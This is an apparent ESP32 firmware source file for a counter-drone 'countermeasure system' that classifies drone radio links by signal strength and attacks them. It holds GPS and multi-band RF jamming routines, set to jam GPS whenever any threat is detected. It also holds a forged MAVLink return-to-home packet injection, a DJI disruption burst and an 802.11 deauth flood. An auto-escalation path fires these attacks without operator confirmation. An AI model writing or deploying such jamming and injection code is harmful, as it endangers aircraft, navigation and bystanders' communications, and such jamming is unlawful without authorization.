#include "countermeasures.h"

// Countermeasure-specific constants (not in config.h)
#define JAMMING_DURATION_MS       2000
#define INJECTION_RETRY_COUNT     5
#define VCO_DAC_1_PIN             25  // 5.8GHz / 2.4GHz
#define VCO_DAC_2_PIN             26  // 900MHz / 1.5GHz GPS

#define ENABLE_GPS_JAMMING        true // Always jam GPS if any threat detected

CountermeasureSystem::CountermeasureSystem() {
    systemArmed = false;
    powerAmplifierEnabled = 0;
    currentThreat = {0, 0, THREAT_NONE, PROTOCOL_UNKNOWN, 0, 0, false};
}

void CountermeasureSystem::initialize() {
    Serial.println("[CM] Countermeasure system initialized");
    Serial.println("[CM] WARNING: Active countermeasures disabled by default");
    Serial.println("[CM] Define ENABLE_COUNTERMEASURES to activate");
    
    #ifdef ENABLE_COUNTERMEASURES
    Serial.println("[CM] *** COUNTERMEASURES ENABLED ***");
    Serial.println("[CM] Ensure legal authorization before use");
    
    // Initialize DAC pins for VCOs
    pinMode(VCO_DAC_1_PIN, OUTPUT);
    pinMode(VCO_DAC_2_PIN, OUTPUT);
    dacWrite(VCO_DAC_1_PIN, 0);
    dacWrite(VCO_DAC_2_PIN, 0);
    #endif
}

void CountermeasureSystem::armSystem(bool armed) {
    systemArmed = armed;
    Serial.printf("[CM] System %s\n", armed ? "ARMED" : "DISARMED");
}

ThreatLevel CountermeasureSystem::assessThreat(uint8_t moduleIndex, int rssiValue) {
    ThreatLevel level = THREAT_NONE;
    
    if (rssiValue >= RSSI_THRESHOLD_CRITICAL) {
        level = THREAT_CRITICAL;
    } else if (rssiValue >= RSSI_THRESHOLD_HIGH) {
        level = THREAT_HIGH;
    } else if (rssiValue >= RSSI_THRESHOLD_MEDIUM) {
        level = THREAT_MEDIUM;
    } else if (rssiValue >= RSSI_THRESHOLD_LOW) {
        level = THREAT_LOW;
    }
    
    // Update threat data
    if (level > THREAT_NONE) {
        if (!currentThreat.isActive) {
            currentThreat.firstDetectionTime = millis();
        }
        currentThreat.moduleIndex = moduleIndex;
        currentThreat.rssiValue = rssiValue;
        currentThreat.level = level;
        currentThreat.lastUpdateTime = millis();
        currentThreat.isActive = true;
        currentThreat.detectedProtocol = analyzeSignalPattern(moduleIndex, rssiValue);
    } else {
        // Clear threat if timeout exceeded
        if (currentThreat.isActive && 
            (millis() - currentThreat.lastUpdateTime > THREAT_TIMEOUT_MS)) {
            currentThreat.isActive = false;
            currentThreat.level = THREAT_NONE;
        }
    }
    
    return level;
}

DroneProtocol CountermeasureSystem::analyzeSignalPattern(uint8_t moduleIndex, int rssi) {
    // Pattern recognition based on frequency band and signal characteristics
    
    switch(moduleIndex) {
        case 0: // CC1101 (900 MHz)
            if (rssi > 70) {
                // Strong 900MHz signal likely ELRS or Crossfire
                // ELRS uses LoRa which is very resilient, Crossfire is FSK/LoRa
                return PROTOCOL_ELRS; 
            } else if (rssi > 50) {
                return PROTOCOL_MAVLINK;
            }
            break;
            
        case 1: // NRF24L01+ (2.4 GHz)
            if (rssi > 75) {
                return PROTOCOL_DJI_OCUSYNC;
            } else if (rssi > 60) {
                return PROTOCOL_OPENIPC; // OpenIPC or generic internal Wi-Fi
            }
            break;
            
        case 2: // RX5808 (5.8 GHz)
            if (rssi > 80) {
                return PROTOCOL_DJI_OCUSYNC;
            } else if (rssi > 65) {
                // High RSSI could be Walksnail / BetaFPV ArtLynk (digital)
                return PROTOCOL_WALKSNAIL;
            } else {
                return PROTOCOL_ANALOG_VIDEO;
            }
            break;
    }
    
    return PROTOCOL_UNKNOWN;
}

void CountermeasureSystem::sweepDAC(uint8_t dacPin, uint32_t duration, uint16_t minVoltage, uint16_t maxVoltage) {
    #ifdef ENABLE_COUNTERMEASURES
    uint32_t start = millis();
    uint8_t dacValue = minVoltage;
    int8_t step = 5;
    
    while(millis() - start < duration) {
        dacWrite(dacPin, dacValue);
        dacValue += step;
        if(dacValue >= maxVoltage || dacValue <= minVoltage) {
            step = -step; // Reverse sweep direction (triangle wave)
        }
        delayMicroseconds(50); // fast sweep
    }
    dacWrite(dacPin, 0); // turn off
    #endif
}

void CountermeasureSystem::executeVCOJamming(CountermeasureType type) {
    #ifdef ENABLE_COUNTERMEASURES
    Serial.print("[CM] VCO Juggernaut Attack: ");
    
    switch(type) {
        case CM_VCO_VIDEO_JAMMING:
            Serial.println("5.8GHz / 2.4GHz Video (Analog/Digital)");
            // Sweep DAC1 which controls 5.8GHz and 2.4GHz VCOs
            sweepDAC(VCO_DAC_1_PIN, JAMMING_DURATION_MS, 0, 255);
            break;
        case CM_VCO_CONTROL_JAMMING:
            Serial.println("900MHz/2.4GHz Control (ELRS)");
            // Sweep DAC2 which controls 900MHz VCO
            sweepDAC(VCO_DAC_2_PIN, JAMMING_DURATION_MS, 50, 200);
            break;
        case CM_VCO_GPS_JAMMING:
            Serial.println("1.5GHz GPS Denial");
            // Secondary sweep on DAC2 for GPS VCO
            sweepDAC(VCO_DAC_2_PIN, JAMMING_DURATION_MS, 100, 150);
            break;
        default:
            break;
    }
    #else
    Serial.println("[CM] VCO Juggernaut disabled");
    #endif
}

void CountermeasureSystem::executeWidebandjamming(uint8_t chipSelectPin, uint32_t frequency) {
    #ifdef ENABLE_COUNTERMEASURES
    Serial.printf("[CM] Executing wideband jamming on CS pin %d\n", chipSelectPin);
    
    // Generate noise across frequency band
    digitalWrite(chipSelectPin, LOW);
    
    uint32_t startTime = millis();
    while (millis() - startTime < JAMMING_DURATION_MS) {
        // Transmit random data to create interference
        for (int i = 0; i < 64; i++) {
            SPI.transfer(random(0, 256));
        }
        delayMicroseconds(100);
    }
    
    digitalWrite(chipSelectPin, HIGH);
    Serial.println("[CM] Jamming burst complete");
    #else
    Serial.println("[CM] Jamming disabled - ENABLE_COUNTERMEASURES not defined");
    #endif
}

void CountermeasureSystem::executeTargetedJamming(uint8_t chipSelectPin, DroneProtocol protocol) {
    #ifdef ENABLE_COUNTERMEASURES
    Serial.printf("[CM] Targeted jamming: %s\n", getProtocolString(protocol));
    
    // Protocol-specific jamming patterns
    switch(protocol) {
        case PROTOCOL_DJI_LIGHTBRIDGE:
        case PROTOCOL_DJI_OCUSYNC:
            // DJI uses frequency hopping - jam control channels
            executeWidebandjamming(chipSelectPin, 2400000000);
            break;
            
        case PROTOCOL_MAVLINK:
        case PROTOCOL_CROSSFIRE:
            // Jam telemetry uplink
            executeWidebandjamming(chipSelectPin, 915000000);
            break;
            
        default:
            Serial.println("[CM] Unknown protocol - using wideband jamming");
            executeWidebandjamming(chipSelectPin, 0);
            break;
    }
    #else
    Serial.println("[CM] Targeted jamming disabled");
    #endif
}

void CountermeasureSystem::injectMAVLinkRTH(uint8_t chipSelectPin) {
    #ifdef ENABLE_COUNTERMEASURES
    Serial.println("[CM] Injecting MAVLink RTH command");
    
    // MAVLink COMMAND_LONG packet for RTH (MAV_CMD_NAV_RETURN_TO_LAUNCH = 20)
    uint8_t mavlinkPacket[] = {
        0xFE, // STX
        0x21, // Payload length
        0x00, // Packet sequence
        0xFF, // System ID (broadcast)
        0xBE, // Component ID
        0x4C, // Message ID (COMMAND_LONG = 76)
        // Payload: command=20 (RTH), confirmation=0, params all 0
        0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, // CRC placeholder
        0x00
    };
    
    digitalWrite(chipSelectPin, LOW);
    for (int retry = 0; retry < INJECTION_RETRY_COUNT; retry++) {
        SPI.transfer(mavlinkPacket, sizeof(mavlinkPacket));
        delay(50);
    }
    digitalWrite(chipSelectPin, HIGH);
    
    Serial.println("[CM] MAVLink injection complete");
    #else
    Serial.println("[CM] Protocol injection disabled");
    #endif
}

void CountermeasureSystem::injectDJIEmergencyLand(uint8_t chipSelectPin) {
    #ifdef ENABLE_COUNTERMEASURES
    Serial.println("[CM] Injecting DJI emergency landing command");
    Serial.println("[CM] WARNING: DJI protocol is proprietary and encrypted");
    Serial.println("[CM] This is a placeholder - requires reverse engineering");
    
    // DJI protocol injection would require:
    // 1. Decryption of control channel
    // 2. Valid session token
    // 3. Proper packet structure
    // This is non-trivial and likely requires SDR analysis
    
    digitalWrite(chipSelectPin, LOW);
    // Placeholder: send disruption pattern
    for (int i = 0; i < 100; i++) {
        SPI.transfer(0xAA); // Pattern that might disrupt receiver
    }
    digitalWrite(chipSelectPin, HIGH);
    #else
    Serial.println("[CM] DJI injection disabled");
    #endif
}

void CountermeasureSystem::executeDeauthFlood(uint8_t chipSelectPin) {
    #ifdef ENABLE_COUNTERMEASURES
    Serial.println("[CM] Executing deauth flood on 2.4GHz");
    
    // 802.11 deauth frame structure (simplified)
    uint8_t deauthFrame[] = {
        0xC0, 0x00, // Frame control (deauth)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (spoofed)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Sequence
        0x07, 0x00  // Reason code (class 3 frame from non-associated STA)
    };
    
    digitalWrite(chipSelectPin, LOW);
    for (int i = 0; i < 50; i++) {
        SPI.transfer(deauthFrame, sizeof(deauthFrame));
        delayMicroseconds(500);
    }
    digitalWrite(chipSelectPin, HIGH);
    
    Serial.println("[CM] Deauth flood complete");
    #else
    Serial.println("[CM] Deauth attack disabled");
    #endif
}

bool CountermeasureSystem::executeCountermeasure(CountermeasureType type, uint8_t chipSelectPin) {
    if (!systemArmed) {
        Serial.println("[CM] System not armed - countermeasure blocked");
        return false;
    }
    
    Serial.printf("[CM] Executing countermeasure type %d\n", type);
    
    // Always trigger GPS Jamming conceptually in EW mode
    #if ENABLE_GPS_JAMMING
    if (type != CM_VCO_GPS_JAMMING) {
        executeVCOJamming(CM_VCO_GPS_JAMMING);
    }
    #endif
    
    switch(type) {
        case CM_JAMMING_BROADBAND:
            executeWidebandjamming(chipSelectPin, 0);
            return true;
            
        case CM_JAMMING_TARGETED:
            executeTargetedJamming(chipSelectPin, currentThreat.detectedProtocol);
            return true;
            
        case CM_PROTOCOL_INJECTION:
            if (currentThreat.detectedProtocol == PROTOCOL_MAVLINK) {
                injectMAVLinkRTH(chipSelectPin);
            } else if (currentThreat.detectedProtocol == PROTOCOL_DJI_LIGHTBRIDGE ||
                       currentThreat.detectedProtocol == PROTOCOL_DJI_OCUSYNC) {
                injectDJIEmergencyLand(chipSelectPin);
            }
            return true;
            
        case CM_DEAUTH_FLOOD:
            executeDeauthFlood(chipSelectPin);
            return true;
            
        case CM_VCO_VIDEO_JAMMING:
        case CM_VCO_CONTROL_JAMMING:
        case CM_VCO_GPS_JAMMING:
            executeVCOJamming(type);
            return true;
            
        default:
            Serial.println("[CM] Unknown countermeasure type");
            return false;
    }
}

void CountermeasureSystem::autoRespond(uint8_t moduleIndex, int rssiValue, uint8_t chipSelectPin) {
    ThreatLevel threat = assessThreat(moduleIndex, rssiValue);
    
    if (!systemArmed || threat == THREAT_NONE) {
        return;
    }
    
    // Automatic escalation based on threat level
    switch(threat) {
        case THREAT_LOW:
            // Monitor only
            Serial.printf("[CM] Low threat detected - monitoring\n");
            break;
            
        case THREAT_MEDIUM:
            // Log and prepare
            Serial.printf("[CM] Medium threat - protocol: %s\n", 
                         getProtocolString(currentThreat.detectedProtocol));
            break;
            
        case THREAT_HIGH:
            // Execute targeted jamming
            Serial.println("[CM] HIGH THREAT - Initiating targeted countermeasures");
            executeCountermeasure(CM_JAMMING_TARGETED, chipSelectPin);
            break;
            
        case THREAT_CRITICAL:
            // Full countermeasures
            Serial.println("[CM] *** CRITICAL THREAT - FULL COUNTERMEASURES ***");
            
            // Execute protocol specific heavy jamming
            if (currentThreat.detectedProtocol == PROTOCOL_ELRS || currentThreat.detectedProtocol == PROTOCOL_CROSSFIRE) {
                executeCountermeasure(CM_VCO_CONTROL_JAMMING, chipSelectPin);
            } else if (currentThreat.detectedProtocol == PROTOCOL_WALKSNAIL || currentThreat.detectedProtocol == PROTOCOL_ANALOG_VIDEO || currentThreat.detectedProtocol == PROTOCOL_BETAFPV_ARTLYNK) {
                executeCountermeasure(CM_VCO_VIDEO_JAMMING, chipSelectPin);
            } else if (currentThreat.detectedProtocol == PROTOCOL_OPENIPC) {
                executeCountermeasure(CM_DEAUTH_FLOOD, chipSelectPin);
                executeCountermeasure(CM_VCO_VIDEO_JAMMING, chipSelectPin);
            } else {
                executeCountermeasure(CM_PROTOCOL_INJECTION, chipSelectPin);
                delay(500);
                executeCountermeasure(CM_JAMMING_BROADBAND, chipSelectPin);
            }
            break;
            
        default:
            break;
    }
}

const char* CountermeasureSystem::getThreatLevelString(ThreatLevel level) {
    switch(level) {
        case THREAT_NONE:     return "NONE";
        case THREAT_LOW:      return "LOW";
        case THREAT_MEDIUM:   return "MEDIUM";
        case THREAT_HIGH:     return "HIGH";
        case THREAT_CRITICAL: return "CRITICAL";
        default:              return "UNKNOWN";
    }
}

const char* CountermeasureSystem::getProtocolString(DroneProtocol protocol) {
    switch(protocol) {
        case PROTOCOL_UNKNOWN:          return "Unknown";
        case PROTOCOL_DJI_LIGHTBRIDGE:  return "DJI Lightbridge";
        case PROTOCOL_DJI_OCUSYNC:      return "DJI OcuSync";
        case PROTOCOL_MAVLINK:          return "MAVLink";
        case PROTOCOL_ELRS:             return "ExpressLRS";
        case PROTOCOL_CROSSFIRE:        return "TBS Crossfire";
        case PROTOCOL_ANALOG_VIDEO:     return "Analog Video";
        case PROTOCOL_WALKSNAIL:        return "Walksnail Avatar";
        case PROTOCOL_BETAFPV_ARTLYNK:  return "BetaFPV ArtLynk";
        case PROTOCOL_OPENIPC:          return "OpenIPC Digital";
        default:                        return "Unknown";
    }
}
